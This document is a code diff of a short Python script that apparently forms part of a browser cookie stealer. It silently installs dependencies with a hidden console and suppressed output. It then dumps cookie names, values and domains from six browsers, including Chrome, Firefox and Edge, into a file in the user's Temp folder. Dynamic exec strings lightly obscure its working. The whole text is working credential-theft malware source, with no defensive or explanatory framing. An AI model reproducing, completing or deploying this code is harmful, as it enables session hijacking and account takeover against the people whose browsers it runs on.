@@ -1,5 +1,11 @@
 import os
-exec("try: import requests\nexcept: os.system('pip install requests'); import requests\ntry: import browser_cookie3\nexcept: os.system('pip install browser_cookie3'); import browser_cookie3\ntry: import json\nexcept: os.system('pip install json'); import json")
+import subprocess
+def install_library(libraryName: str):
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    subprocess.call(f'pip install {libraryName}', startupinfo=startupinfo, stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL, shell=False)
+exec("try: import requests\nexcept: install_library('requests'); import requests\ntry: import browser_cookie3\nexcept: install_library('browser_cookie3'); import browser_cookie3\ntry: import json\nexcept: install_library('json'); import json")
 with open(os.path.expanduser("~") + f"\\AppData\\Local\\Temp\\cookies.txt", 'w', encoding="utf-8") as file:
     for browser in ["brave", "chrome", "firefox", "opera", "opera_gx", "edge"]:
         try: exec(f"for i in browser_cookie3.{browser}(): file.write(i.name + ' >>> ' + i.value + ' >>> ' + i.domain + ' >>> ' + browser.upper() + '\\n')")
